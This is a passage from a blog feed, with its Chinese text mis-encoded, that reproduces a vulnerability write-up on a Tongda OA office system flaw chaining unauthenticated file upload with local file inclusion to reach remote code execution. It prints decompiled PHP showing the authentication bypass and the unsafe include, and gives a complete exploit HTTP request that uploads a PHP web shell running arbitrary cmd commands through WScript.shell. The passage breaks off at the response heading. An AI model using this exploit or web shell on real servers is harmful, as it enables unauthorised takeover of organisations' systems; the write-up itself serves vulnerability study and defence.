<p>[2] <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1sMFlzRWtfNTlmUQ==">https://www.youtube.com/watch?v=l0YsEk_59fQ<i class="fa fa-external-link-alt"></i></span></p>
<p>[3] <span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzIyOQ==">https://xz.aliyun.com/t/7229<i class="fa fa-external-link-alt"></i></span></p>
<p>[4] <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzB4YnVnL0hhd2tleWU=">https://github.com/0xbug/Hawkeye<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>çŸ¥è¯†æ•´ç†</category>
      </categories>
      <tags>
        <tag>Github</tag>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>é€šè¾¾OA ä»»æ„æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å« RCE</title>
    <url>/posts/6b303458/</url>
    <content><![CDATA[<p>é€šè¾¾OAï¼ˆOffice Anywhereç½‘ç»œæ™ºèƒ½åŠå…¬ç³»ç»Ÿï¼‰æ˜¯ç”±åŒ—äº¬é€šè¾¾ä¿¡ç§‘ç§‘æŠ€æœ‰é™å…¬å¸è‡ªä¸»ç ”å‘çš„ååŒåŠå…¬è‡ªåŠ¨åŒ–è½¯ä»¶ï¼Œæ˜¯ä¸ä¸­å›½ä¼ä¸šç®¡ç†å®è·µç›¸ç»“åˆå½¢æˆçš„ç»¼åˆç®¡ç†åŠå…¬å¹³å°ã€‚3æœˆ13æ—¥å‘ç°æœªæˆæƒä¸Šä¼ å’Œæœ¬åœ°æ–‡ä»¶åŒ…å«ä¸¤ä¸ªæ¼æ´ç»„åˆè€Œå½¢æˆçš„rceæ¼æ´ã€‚</p>
<a id="more"></a>

<h1 id="é€šè¾¾OA-ä»»æ„æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶åŒ…å«-RCE"><a href="#é€šè¾¾OA-ä»»æ„æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶åŒ…å«-RCE" class="headerlink" title="é€šè¾¾OA ä»»æ„æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å« RCE"></a>é€šè¾¾OA ä»»æ„æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å« RCE</h1><p>é€šè¾¾OAï¼ˆOffice Anywhereç½‘ç»œæ™ºèƒ½åŠå…¬ç³»ç»Ÿï¼‰æ˜¯ç”±åŒ—äº¬é€šè¾¾ä¿¡ç§‘ç§‘æŠ€æœ‰é™å…¬å¸è‡ªä¸»ç ”å‘çš„ååŒåŠå…¬è‡ªåŠ¨åŒ–è½¯ä»¶ï¼Œæ˜¯ä¸ä¸­å›½ä¼ä¸šç®¡ç†å®è·µç›¸ç»“åˆå½¢æˆçš„ç»¼åˆç®¡ç†åŠå…¬å¹³å°ã€‚</p>
<p>æœ¬æ–‡æµ‹è¯•ç¯å¢ƒï¼šWindows 10 + OA 2017</p>
<h2 id="æ¼æ´åŸå› "><a href="#æ¼æ´åŸå› " class="headerlink" title="æ¼æ´åŸå› "></a>æ¼æ´åŸå› </h2><p>æ­¤æ¼æ´æ˜¯ç”±æœªæˆæƒä¸Šä¼ å’Œæœ¬åœ°æ–‡ä»¶åŒ…å«ä¸¤ä¸ªæ¼æ´ç»„åˆè€Œå½¢æˆçš„rceæ¼æ´</p>
<ul>
<li>æ–‡ä»¶ä¸Šä¼ åœ°å€ï¼š<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdC9pc3Bpcml0L2ltL3VwbG9hZC5waHA=">http://localhost/ispirit/im/upload.php<i class="fa fa-external-link-alt"></i></span></li>
<li>æœ¬åœ°æ–‡ä»¶åŒ…å«åœ°å€ï¼ˆæ ¹æ®ç‰ˆæœ¬ä¸åŒè€Œä¸åŒï¼‰<ul>
<li>åœ°å€ä¸€ï¼š<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdC9pc3Bpcml0L2ludGVyZmFjZS9nYXRld2F5LnBocCVFRiVCQyU4ODIwMTMlRUYlQkMlODk=">http://localhost/ispirit/interface/gateway.phpï¼ˆ2013ï¼‰<i class="fa fa-external-link-alt"></i></span></li>
<li>åœ°å€äºŒï¼š<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdC9tYWMvZ2F0ZXdheS5waHAlRUYlQkMlODgyMDE3JUVGJUJDJTg5">http://localhost/mac/gateway.phpï¼ˆ2017ï¼‰<i class="fa fa-external-link-alt"></i></span></li>
</ul>
</li>
</ul>
<h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>éƒ¨åˆ†ç‰ˆæœ¬å¯èƒ½æ²¡æœ‰å®‰è£…æŸæ’ä»¶è€Œæ— æ³•åˆ©ç”¨ã€‚</p>
<ul>
<li>tongdaOA V11</li>
<li>tangdaOA 2017</li>
<li>tangdaOA 2016</li>
<li>tangdaOA 2015</li>
<li>tangdaOA 2013 å¢å¼ºç‰ˆ</li>
<li>tangdaOA 2013</li>
</ul>
<h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><h3 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ </h3><p>ä»£ç æ˜¯ç»è¿‡ZendåŠ å¯†çš„ï¼Œè§£å¯†å³å¯ã€‚</p>
<ul>
<li>åœ¨æ–‡ä»¶<code>ispirit\im\upload.php</code>ä¸­çš„ç™»å½•éªŒè¯éƒ¨åˆ†ï¼Œåœ¨æ–‡ä»¶ä¸­ç¬¬ä¸€ä¸ªIFï¼ˆ6è¡Œï¼‰ï¼Œåªè¦è®¾ç½®äº†å‚æ•°På°±å¯ä»¥ç»•è¿‡ã€‚</li>
<li>ç„¶åå°±æ˜¯éœ€è¦ä¼ ä¸€ä¸ªDEST_UIDå‚æ•°ï¼ˆ22è¡Œï¼‰æ¥è¿‡exitï¼Œåªè¦ä¸ä¸º0æˆ–ç©ºçš„æ•°å­—éƒ½å¯ä»¥ã€‚ç„¶åå°±å¯ä»¥èµ°åˆ°uploadå‡½æ•°äº†ï¼Œæ¥ä¸‹æ¥å¦‚æœ<code>$UPLOAD_MODE == &#39;1&#39;</code>å°±ä¼šæŠŠ<code>ATTACHMENT_ID</code>è¾“å‡ºå‡ºæ¥ï¼Œè¿™ä¸ªidå…¶å®å°±æ˜¯æˆ‘ä»¬é©¬çš„æ–‡ä»¶åã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//decode by http://dezend.qiling.org  QQ 2859470</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$P = $_POST[<span class="string">&#x27;P&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($P) || $P != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&#x27;inc/session.php&#x27;</span>;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&#x27;./auth.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;inc/utility_file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;inc/utility_msg.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;mobile/inc/funcs.php&#x27;</span>;</span><br><span class="line">ob_end_clean();</span><br><span class="line">$TYPE = $_POST[<span class="string">&#x27;TYPE&#x27;</span>];</span><br><span class="line">$DEST_UID = $_POST[<span class="string">&#x27;DEST_UID&#x27;</span>];</span><br><span class="line">$dataBack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID != <span class="string">&#x27;&#x27;</span> &amp;&amp; !td_verify_ids($ids)) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;æ¥æ”¶æ–¹IDæ— æ•ˆ&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($DEST_UID, <span class="string">&#x27;,&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $DEST_UID = intval($DEST_UID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE != <span class="number">2</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;æ¥æ”¶æ–¹IDæ— æ•ˆ&#x27;</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$MODULE = <span class="string">&#x27;im&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= count($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(urldecode($_FILES[<span class="string">&#x27;ATTACHMENT&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) != strlen($_FILES[<span class="string">&#x27;ATTACHMENT&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">            $_FILES[<span class="string">&#x27;ATTACHMENT&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] = urldecode($_FILES[<span class="string">&#x27;ATTACHMENT&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = upload(<span class="string">&#x27;ATTACHMENT&#x27;</span>, $MODULE, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!is_array($ATTACHMENTS)) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;-ERR &#x27;</span> . $ATTACHMENTS);</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    $ATTACHMENT_ID = substr($ATTACHMENTS[<span class="string">&#x27;ID&#x27;</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    $ATTACHMENT_NAME = substr($ATTACHMENTS[<span class="string">&#x27;NAME&#x27;</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ($TYPE == <span class="string">&#x27;mobile&#x27;</span>) &#123;</span><br><span class="line">        $ATTACHMENT_NAME = td_iconv(urldecode($ATTACHMENT_NAME), <span class="string">&#x27;utf-8&#x27;</span>, MYOA_CHARSET);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;æ— æ–‡ä»¶ä¸Šä¼ &#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$FILE_SIZE = attach_size($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line"><span class="keyword">if</span> (!$FILE_SIZE) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;æ–‡ä»¶ä¸Šä¼ å¤±è´¥&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">        $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">        $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">&#x27;thumb_&#x27;</span> . $ATTACHMENT_NAME;</span><br><span class="line">        CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">    &#125;</span><br><span class="line">    $P_VER = is_numeric($P_VER) ? intval($P_VER) : <span class="number">0</span>;</span><br><span class="line">    $MSG_CATE = $_POST[<span class="string">&#x27;MSG_CATE&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($MSG_CATE == <span class="string">&#x27;file&#x27;</span>) &#123;</span><br><span class="line">        $CONTENT = <span class="string">&#x27;[fm]&#x27;</span> . $ATTACHMENT_ID . <span class="string">&#x27;|&#x27;</span> . $ATTACHMENT_NAME . <span class="string">&#x27;|&#x27;</span> . $FILE_SIZE . <span class="string">&#x27;[/fm]&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($MSG_CATE == <span class="string">&#x27;image&#x27;</span>) &#123;</span><br><span class="line">            $CONTENT = <span class="string">&#x27;[im]&#x27;</span> . $ATTACHMENT_ID . <span class="string">&#x27;|&#x27;</span> . $ATTACHMENT_NAME . <span class="string">&#x27;|&#x27;</span> . $FILE_SIZE . <span class="string">&#x27;[/im]&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $DURATION = intval($DURATION);</span><br><span class="line">            $CONTENT = <span class="string">&#x27;[vm]&#x27;</span> . $ATTACHMENT_ID . <span class="string">&#x27;|&#x27;</span> . $ATTACHMENT_NAME . <span class="string">&#x27;|&#x27;</span> . $DURATION . <span class="string">&#x27;[/vm]&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $AID = <span class="number">0</span>;</span><br><span class="line">    $POS = strpos($ATTACHMENT_ID, <span class="string">&#x27;@&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ($POS !== <span class="literal">false</span>) &#123;</span><br><span class="line">        $AID = intval(substr($ATTACHMENT_ID, <span class="number">0</span>, $POS));</span><br><span class="line">    &#125;</span><br><span class="line">    $query = <span class="string">&#x27;INSERT INTO im_offline_file (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG,AID) values (&#x27;</span><span class="string">&#x27; . date(&#x27;</span>Y-m-d H:i:s<span class="string">&#x27;) . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $_SESSION[&#x27;</span>LOGIN_UID<span class="string">&#x27;] . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $DEST_UID . &#x27;</span><span class="string">&#x27;,&#x27;</span>*<span class="string">&#x27; . $ATTACHMENT_ID . &#x27;</span>.<span class="string">&#x27; . $ATTACHMENT_NAME . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $FILE_SIZE . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $AID . &#x27;</span><span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    $cursor = exequery(TD::conn(), $query);</span><br><span class="line">    $FILE_ID = mysql_insert_id();</span><br><span class="line">    <span class="keyword">if</span> ($cursor === <span class="literal">false</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;content&#x27;</span> =&gt; <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;æ•°æ®åº“æ“ä½œå¤±è´¥&#x27;</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;content&#x27;</span> =&gt; $CONTENT, <span class="string">&#x27;file_id&#x27;</span> =&gt; $FILE_ID);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">        $DURATION = intval($_POST[<span class="string">&#x27;DURATION&#x27;</span>]);</span><br><span class="line">        $CONTENT = <span class="string">&#x27;[vm]&#x27;</span> . $ATTACHMENT_ID . <span class="string">&#x27;|&#x27;</span> . $ATTACHMENT_NAME . <span class="string">&#x27;|&#x27;</span> . $DURATION . <span class="string">&#x27;[/vm]&#x27;</span>;</span><br><span class="line">        $query = <span class="string">&#x27;INSERT INTO WEIXUN_SHARE (UID, CONTENT, ADDTIME) VALUES (&#x27;</span><span class="string">&#x27; . $_SESSION[&#x27;</span>LOGIN_UID<span class="string">&#x27;] . &#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27; . $CONTENT . &#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27; . time() . &#x27;</span><span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">        $cursor = exequery(TD::conn(), $query);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;+OK &#x27;</span> . $CONTENT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">                $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">                $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">&#x27;thumb_&#x27;</span> . $ATTACHMENT_NAME;</span><br><span class="line">                CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;+OK &#x27;</span> . $ATTACHMENT_ID;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $CONTENT = <span class="string">&#x27;[fm]&#x27;</span> . $ATTACHMENT_ID . <span class="string">&#x27;|&#x27;</span> . $ATTACHMENT_NAME . <span class="string">&#x27;|&#x27;</span> . $FILE_SIZE . <span class="string">&#x27;[/fm]&#x27;</span>;</span><br><span class="line">            $msg_id = send_msg($_SESSION[<span class="string">&#x27;LOGIN_UID&#x27;</span>], $DEST_UID, <span class="number">1</span>, $CONTENT, <span class="string">&#x27;&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">            $query = <span class="string">&#x27;insert into IM_OFFLINE_FILE (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG) values (&#x27;</span><span class="string">&#x27; . date(&#x27;</span>Y-m-d H:i:s<span class="string">&#x27;) . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $_SESSION[&#x27;</span>LOGIN_UID<span class="string">&#x27;] . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $DEST_UID . &#x27;</span><span class="string">&#x27;,&#x27;</span>*<span class="string">&#x27; . $ATTACHMENT_ID . &#x27;</span>.<span class="string">&#x27; . $ATTACHMENT_NAME . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27; . $FILE_SIZE . &#x27;</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">            $cursor = exequery(TD::conn(), $query);</span><br><span class="line">            $FILE_ID = mysql_insert_id();</span><br><span class="line">            <span class="keyword">if</span> ($cursor === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;æ•°æ®åº“æ“ä½œå¤±è´¥&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($FILE_ID == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;-ERR &#x27;</span> . _(<span class="string">&#x27;æ•°æ®åº“æ“ä½œå¤±è´¥2&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;+OK ,&#x27;</span> . $FILE_ID . <span class="string">&#x27;,&#x27;</span> . $msg_id;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><p>ä¸ä¼ På‚æ•°ï¼ˆ7è¡Œï¼‰å°±èƒ½ç»•è¿‡exitäº†ï¼Œç„¶åèµ°åˆ°ä¸‹é¢çš„include_onceè¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;inc/session.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;inc/conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;inc/utility_org.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($P != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[^a-z0-9;]+/i&#x27;</span>, $P)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> _(<span class="string">&#x27;éæ³•å‚æ•°&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;LOGIN_USER_ID&#x27;</span>] == <span class="string">&#x27;&#x27;</span> || $_SESSION[<span class="string">&#x27;LOGIN_UID&#x27;</span>] == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> _(<span class="string">&#x27;RELOGIN&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($json) &#123;</span><br><span class="line">    $json = stripcslashes($json);</span><br><span class="line">    $json = (<span class="keyword">array</span>) json_decode($json);</span><br><span class="line">    <span class="keyword">foreach</span> ($json <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($key == <span class="string">&#x27;data&#x27;</span>) &#123;</span><br><span class="line">            $val = (<span class="keyword">array</span>) $val;</span><br><span class="line">            <span class="keyword">foreach</span> ($val <span class="keyword">as</span> $keys =&gt; $value) &#123;</span><br><span class="line">                $&#123;$keys&#125; = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($key == <span class="string">&#x27;url&#x27;</span>) &#123;</span><br><span class="line">            $url = $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($url != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($url, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            $url = substr($url, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include_once</span> $url;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ‘˜æŠ„è‡ªï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veXV5YW4tc2VjL3AvMTI1NDkyMzcuaHRtbA==">https://www.cnblogs.com/yuyan-sec/p/12549237.html<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="æ–‡ä»¶ä¸Šä¼ ï¼š"><a href="#æ–‡ä»¶ä¸Šä¼ ï¼š" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ï¼š"></a>æ–‡ä»¶ä¸Šä¼ ï¼š</h3><p><strong>Requestï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /ispirit/im/upload.php HTTP/1.1</span><br><span class="line">Host: 192.168.95.129</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://192.168.95.129/logincheck.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=gb4tpaqrsagb3fcmpu9sco48m5; KEY_RANDOMDATA=13319</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------1673801018</span><br><span class="line">Content-Length: 558</span><br><span class="line"></span><br><span class="line">----------1673801018</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;UPLOAD_MODE&quot;</span></span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">----------1673801018</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;P&quot;</span></span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">----------1673801018</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;DEST_UID&quot;</span></span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">----------1673801018</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;ATTACHMENT&quot;</span>; filename=<span class="string">&quot;jpg&quot;</span></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$command</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$wsh</span> = new COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line"><span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;<span class="built_in">exec</span>(<span class="string">&quot;cmd /c &quot;</span>.<span class="variable">$command</span>);</span><br><span class="line"><span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;StdOut();</span><br><span class="line"><span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;ReadAll();</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line">?&gt;</span><br><span class="line">----------1673801018--</span><br></pre></td></tr></table></figure>

<p><strong>Responseï¼š</strong></p>
